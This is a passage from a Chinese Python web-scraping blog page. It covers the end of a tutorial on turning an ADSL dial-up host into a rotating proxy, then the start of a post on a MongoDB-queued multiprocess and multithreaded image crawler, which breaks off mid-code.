                    <li>KEY 是客户端请求服务器时的凭证，在 client 的 request.conf 也有相同的配置，二者保持一致即可。</li>
                    <li>NEED_AUTH 在获取当前保存的 IP（即代理的 IP）的时候，为防止自己的主机代理被滥用，在获取 IP 的时候，需要加权限验证。</li>
                    <li>AUTH_USER 和 AUTH_PASSWORD 分别是认证用户名密码。</li>
                    <li>PORT 默认端口，返回保存的结果中会自动添加这个端口，组成一个 IP:PORT 的代理形式。</li>
                  </ul>
                  <h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">cd server</span><br><span class="line">nohup python main.py</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h4 id="ADSL-客户机"><a href="#ADSL-客户机" class="headerlink" title="ADSL 客户机"></a>ADSL 客户机</h4>
                  <h5 id="克隆项目-1"><a href="#克隆项目-1" class="headerlink" title="克隆项目"></a>克隆项目</h5>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/Germey/AutoProxy.git</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h5 id="修改配置-1"><a href="#修改配置-1" class="headerlink" title="修改配置"></a>修改配置</h5>
                  <p>修改 reqeust.conf 文件</p>
                  <ul>
                    <li>KEY 是客户端请求服务器时的凭证，在 server 的 config.py 也有相同的配置，二者保持一致即可。</li>
                    <li>SERVER 是服务器项目运行后的地址，一般为 http://&lt;服务器 IP&gt;:&lt;服务器端口&gt;/record。如<code>http://120.27.14.24:5000/record</code>。</li>
                  </ul>
                  <p>修改 pppoe.sh 文件 这里面写上重新拨号的几条命令，记得在前两行配置一下环境变量，配置上拨号命令所在的目录，以防出现脚本无法运行的问题。</p>
                  <h4 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h4>
                  <p>设置定时任务</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">crontab -e</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>输入 crontab 的实例命令</p>
                  <figure class="highlight awk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">*<span class="regexp">/5 * * * * /</span>var<span class="regexp">/py/</span>AutoProxy<span class="regexp">/client/</span>request.sh <span class="regexp">/var/</span>py<span class="regexp">/AutoProxy/</span>client<span class="regexp">/request.conf &gt;&gt; /</span>var<span class="regexp">/py/</span>AutoProxy<span class="regexp">/client/</span>request.log</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>注意修改路径，你的项目在哪里，都统一修改成自己项目的路径。 最前面的*/5 是 5 分钟执行一次。 好了，保存之后，定时任务就会开启。</p>
                  <h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h3>
                  <p>这样一来，访问服务器地址，就可以得到 ADSL 拨号客户机的 IP 了。</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.27.14.24:5000'</span></span><br><span class="line">proxy = requests.<span class="builtin-name">get</span>(url, auth=(<span class="string">'admin'</span>, <span class="string">'123'</span>)).text</span><br><span class="line"><span class="builtin-name">print</span>(proxy)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>实例结果：</p>
                  <figure class="highlight accesslog">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="number">116.208.97.22:8888</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3>
                  <p>如果你有域名，可以自己解析一个域名，这样就可以直接请求自己的域名，拿到实时好用的代理了，而且定时更新。 <img src="http://opencdn.cuiqingcai.com/proxy.png" alt=""></p>
                  <h3 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h3>
                  <h4 id="urllib2"><a href="#urllib2" class="headerlink" title="urllib2"></a>urllib2</h4>
                  <figure class="highlight reasonml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import urllib2</span><br><span class="line">proxy_handler = urllib2.<span class="constructor">ProxyHandler(&#123;<span class="string">"http"</span>: '<span class="params">http</span>:<span class="operator">/</span><span class="operator">/</span>' + <span class="params">proxy</span>&#125;)</span></span><br><span class="line">opener = urllib2.build<span class="constructor">_opener(<span class="params">proxy_handler</span>)</span></span><br><span class="line">urllib2.install<span class="constructor">_opener(<span class="params">opener</span>)</span></span><br><span class="line">response = urllib2.urlopen('http:<span class="comment">//httpbin.org/get')</span></span><br><span class="line">print response.read<span class="literal">()</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3>
                  <figure class="highlight processing">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxies = &#123;</span><br><span class="line"><span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line">r = requests.<span class="built_in">get</span>(<span class="string">'http://httpbin.org/get'</span>, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.<span class="built_in">text</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上便秒级解决了动态 IP 解析，自己实现了一遍 DDNS，爽！ 那这样以来，以后就可以直接请求你的主机获取一个最新可用的代理 IP 了，稳定可用，定时变化！ 以上便是 ADSL 拨号服务器配置的全过程，希望对大家有帮助！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-11-22 00:18:06" itemprop="dateCreated datePublished" datetime="2016-11-22T00:18:06+08:00">2016-11-22</time>
                </span>
                <span id="/3443.html" class="post-meta-item leancloud_visitors" data-flag-title="Python爬虫进阶七之设置ADSL拨号服务器代理" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>6.4k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>6 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3363.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3363.html" class="post-title-link" itemprop="url">小白爬虫第四弹之爬虫快跑（多进程+多线程）</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>ＰＳ：使用多线程时好像在目录切换的问题上存在问题，可以给线程加个锁试试 Hello 大家好！我又来了。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ图片20161102215153.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ图片20161102215153.jpg" alt="QQ图片20161102215153"></a> 你是不是发现下载图片速度特别慢、难以忍受啊！对于这种问题 一般解决办法就是多进程了！一个进程速度慢！我就用十个进程，相当于十个人一起干。速度就会快很多啦！（为什么不说多线程？懂点 Python 的小伙伴都知道、GIL 的存在 导致 Python 的多线程有点坑啊！）今天就教大家来做一个多进程的爬虫（其实吧、可以用来做一个超简化版的分布式爬虫） 其实吧！还有一种加速的方法叫做“异步”！不过这玩意儿我没怎么整明白就不出来误人子弟了！（因为爬虫大部分时间都是在等待 response 中！‘异步’则能让程序在等待 response 的时间去做的其他事情。） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt="QQ图片20161022193315"></a> 学过 Python 基础的同学都知道、在多进程中，进程之间是不能相互通信的，这就有一个很坑爹的问题的出现了！多个进程怎么知道那那些需要爬取、哪些已经被爬取了！ 这就涉及到一个东西！这玩意儿叫做队列！！队列！！队列！！其实吧正常来说应该给大家用队列来完成这个教程的， 比如 Tornado 的 queue 模块。（如果需要更为稳定健壮的队列，则请考虑使用 Celery 这一类的专用消息传递工具） 不过为了简化技术种类啊！（才不会告诉你们是我懒，嫌麻烦呢！）这次我们继续使用 MongoDB。 好了！先来理一下思路： 每个进程需要知道那些 URL 爬取过了、哪些 URL 需要爬取！我们来给每个 URL 设置两种状态： outstanding:等待爬取的 URL complete:爬取完成的 URL 诶！等等我们好像忘了啥？ 失败的 URL 的怎么办啊？我们在增加一种状态： processing:正在进行的 URL。 嗯！当一个所有初始的 URL 状态都为 outstanding；当开始爬取的时候状态改为：processing；爬取完成状态改为：complete；失败的 URL 重置状态为：outstanding。为了能够处理 URL 进程被终止的情况、我们设置一个计时参数，当超过这个值时；我们则将状态重置为 outstanding。 下面开整 Go Go Go！ 首先我们需要一个模块：datetime(这个模块比内置 time 模块要好使一点)不会装？？不是吧！ pip install datetime 还有上一篇博文我们已经使用过的 pymongo 下面是队列的代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient, errors</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MogoQueue</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    OUTSTANDING = <span class="number">1</span> <span class="comment">##初始状态</span></span><br><span class="line">    PROCESSING = <span class="number">2</span> <span class="comment">##正在下载状态</span></span><br><span class="line">    COMPLETE = <span class="number">3</span> <span class="comment">##下载完成状态</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, db, collection, timeout=<span class="number">300</span>)</span>:</span><span class="comment">##初始mongodb连接</span></span><br><span class="line">        self.client = MongoClient()</span><br><span class="line">        self.Client = self.client[db]</span><br><span class="line">        self.db = self.Client[collection]</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__bool__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        这个函数，我的理解是如果下面的表达为真，则整个类为真</span></span><br><span class="line"><span class="string">        至于有什么用，后面我会注明的（如果我的理解有误，请指点出来谢谢，我也是Python新手）</span></span><br><span class="line"><span class="string">        $ne的意思是不匹配</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        record = self.db.find_one(</span><br><span class="line">            &#123;<span class="string">'status'</span>: &#123;<span class="string">'$ne'</span>: self.COMPLETE&#125;&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> record <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, url, title)</span>:</span> <span class="comment">##这个函数用来添加新的URL进队列</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.db.insert(&#123;<span class="string">'_id'</span>: url, <span class="string">'status'</span>: self.OUTSTANDING, <span class="string">'主题'</span>: title&#125;)</span><br><span class="line">            print(url, <span class="string">'插入队列成功'</span>)</span><br><span class="line">        <span class="keyword">except</span> errors.DuplicateKeyError <span class="keyword">as</span> e:  <span class="comment">##报错则代表已经存在于队列之中了</span></span><br><span class="line">            print(url, <span class="string">'已经存在于队列中了'</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push_imgurl</span><span class="params">(self, title, url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.db.insert(&#123;<span class="string">'_id'</span>: title, <span class="string">'statue'</span>: self.OUTSTANDING, <span class="string">'url'</span>: url&#125;)</span><br><span class="line">            print(<span class="string">'图片地址插入成功'</span>)</span><br><span class="line">        <span class="keyword">except</span> errors.DuplicateKeyError <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">'地址已经存在了'</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        这个函数会查询队列中的所有状态为OUTSTANDING的值，</span></span><br><span class="line"><span class="string">        更改状态，（query后面是查询）（update后面是更新）</span></span><br><span class="line"><span class="string">        并返回_id（就是我们的ＵＲＬ），MongDB好使吧，^_^</span></span><br><span class="line"><span class="string">        如果没有OUTSTANDING的值则调用repair()函数重置所有超时的状态为OUTSTANDING，</span></span><br><span class="line"><span class="string">        $set是设置的意思，和MySQL的set语法一个意思</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        record = self.db.find_and_modify(</span><br><span class="line">            query=&#123;<span class="string">'status'</span>: self.OUTSTANDING&#125;,</span><br><span class="line">            update=&#123;<span class="string">'$set'</span>: &#123;<span class="string">'status'</span>: self.PROCESSING, <span class="string">'timestamp'</span>: datetime.now()&#125;&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> record:</span><br><span class="line">            <span class="keyword">return</span> record[<span class="string">'_id'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.repair()</span><br><span class="line">            <span class="keyword">raise</span> KeyError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop_title</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        record = self.db.find_one(&#123;<span class="string">'_id'</span>: url&#125;)</span><br><span class="line">        <span class="keyword">return</span> record[<span class="string">'主题'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">peek</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""这个函数是取出状态为 OUTSTANDING的文档并返回_id(URL)"""</span></span><br><span class="line">        record = self.db.find_one(&#123;<span class="string">'status'</span>: self.OUTSTANDING&#125;)</span><br><span class="line">        <span class="keyword">if</span> record:</span><br><span class="line">            <span class="keyword">return</span> record[<span class="string">'_id'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">complete</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="string">"""这个函数是更新已完成的URL完成"""</span></span><br><span class="line">        self.db.update(&#123;<span class="string">'_id'</span>: url&#125;, &#123;<span class="string">'$set'</span>: &#123;<span class="string">'status'</span>: self.COMPLETE&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">repair</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""这个函数是重置状态$lt是比较"""</span></span><br><span class="line">        record = self.db.find_and_modify(</span><br><span class="line">           query=&#123;</span><br><span class="line">               <span class="string">'timestamp'</span>: &#123;<span class="string">'$lt'</span>: datetime.now() - timedelta(seconds=self.timeout)&#125;,</span><br><span class="line">               <span class="string">'status'</span>: &#123;<span class="string">'$ne'</span>: self.COMPLETE&#125;</span><br><span class="line">           &#125;,</span><br><span class="line">            update=&#123;<span class="string">'$set'</span>: &#123;<span class="string">'status'</span>: self.OUTSTANDING&#125;&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> record:</span><br><span class="line">            print(<span class="string">'重置URL状态'</span>, record[<span class="string">'_id'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""这个函数只有第一次才调用、后续不要调用、因为这是删库啊！"""</span></span><br><span class="line">        self.db.drop()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好了，队列我们做好了，下面是获取所有页面的代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> Download <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> mongodb_queue <span class="keyword">import</span> MogoQueue</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spider_queue = MogoQueue(<span class="string">'meinvxiezhenji'</span>, <span class="string">'crawl_queue'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(url)</span>:</span></span><br><span class="line">    response = request.get(url, <span class="number">3</span>)</span><br><span class="line">    Soup = BeautifulSoup(response.text, <span class="string">'lxml'</span>)</span><br><span class="line">    all_a = Soup.find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> all_a:</span><br><span class="line">        title = a.get_text()</span><br><span class="line">        url = a[<span class="string">'href'</span>]</span><br><span class="line">        spider_queue.push(url, title)</span><br><span class="line">    <span class="string">"""上面这个调用就是把URL写入MongoDB的队列了"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    start(<span class="string">'http://www.mzitu.com/all'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""这一段儿就不解释了哦！超级简单的"""</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>下面就是多进程+多线程的下载代码了：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> mongodb_queue <span class="keyword">import</span> MogoQueue</span><br><span class="line"><span class="keyword">from</span> Download <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">SLEEP_TIME = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mzitu_crawler</span><span class="params">(max_threads=<span class="number">10</span>)</span>:</span></span><br><span class="line">    crawl_queue = MogoQueue(<span class="string">'meinvxiezhenji'</span>, <span class="string">'crawl_queue'</span>) <span class="comment">##这个是我们获取URL的队列</span></span><br><span class="line">    <span class="comment">##img_queue = MogoQueue('meinvxiezhenji', 'img_queue')</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pageurl_crawler</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = crawl_queue.pop()</span><br><span class="line">                print(url)</span><br><span class="line">            <span class="keyword">except</span> KeyError:</span><br><span class="line">                print(<span class="string">'队列没有数据'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                img_urls = []</span><br><span class="line">                req = request.get(url, <span class="number">3</span>).text</span><br><span class="line">                title = crawl_queue.pop_title(url)</span><br><span class="line">                mkdir(title)</span><br><span class="line">                os.chdir(<span class="string">'D:\mzitu\\'</span> + title)</span><br><span class="line">                max_span = BeautifulSoup(req, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'pagenavi'</span>).find_all(<span class="string">'span'</span>)[<span class="number">-2</span>].get_text()</span><br><span class="line">                <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span) + <span class="number">1</span>):</span><br><span class="line">                    page_url = url + <span class="string">'/'</span> + str(page)</span><br><span class="line">                    img_url = BeautifulSoup(request.get(page_url, <span class="number">3</span>).text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">                    img_urls.append(img_url)</span><br><span class="line">                    save(img_url)</span><br><span class="line">                crawl_queue.complete(url) <span class="comment">##设置为完成状态</span></span><br><span class="line">                <span class="comment">##img_queue.push_imgurl(title, img_urls)</span></span><br><span class="line">                <span class="comment">##print('插入数据库成功')</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(img_url)</span>:</span></span><br><span class="line">        name = img_url[<span class="number">-9</span>:<span class="number">-4</span>]</span><br><span class="line">        print(<span class="string">u'开始保存：'</span>, img_url)</span><br><span class="line">        img = request.get(img_url, <span class="number">3</span>)</span><br><span class="line">        f = open(name + <span class="string">'.jpg'</span>, <span class="string">'ab'</span>)</span><br><span class="line">        f.write(img.content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">(path)</span>:</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        isExists = os.path.exists(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isExists:</span><br><span class="line">            print(<span class="string">u'建了一个名字叫做'</span>, path, <span class="string">u'的文件夹！'</span>)</span><br><span class="line">            os.makedirs(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">u'名字叫做'</span>, path, <span class="string">u'的文件夹已经存在了！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">while</span> threads <span class="keyword">or</span> crawl_queue:</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        这儿crawl_queue用上了，就是我们__bool__函数的作用，为真则代表我们MongoDB队列里面还有数据</span></span><br><span class="line"><span class="string">        threads 或者 crawl_queue为真都代表我们还没下载完成，程序就会继续执行</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> thread.is_alive(): <span class="comment">##is_alive是判断是否为空,不是空则在队列中删掉</span></span><br><span class="line">                threads.remove(thread)</span><br><span class="line">        <span class="keyword">while</span> len(threads) &lt; max_threads <span class="keyword">or</span> crawl_queue.peek(): <span class="comment">##线程池中的线程少于max_threads 或者 crawl_qeue时</span></span><br><span class="line">            thread = threading.Thread(target=pageurl_crawler) <span class="comment">##创建线程</span></span><br><span class="line">            thread.setDaemon(<span class="literal">True</span>) <span class="comment">##设置守护线程</span></span><br><span class="line">            thread.start() <span class="comment">##启动线程</span></span><br><span class="line">            threads.append(thread) <span class="comment">##添加进线程队列</span></span><br><span class="line">        time.sleep(SLEEP_TIME)</span><br><span class="line"></span><br><span 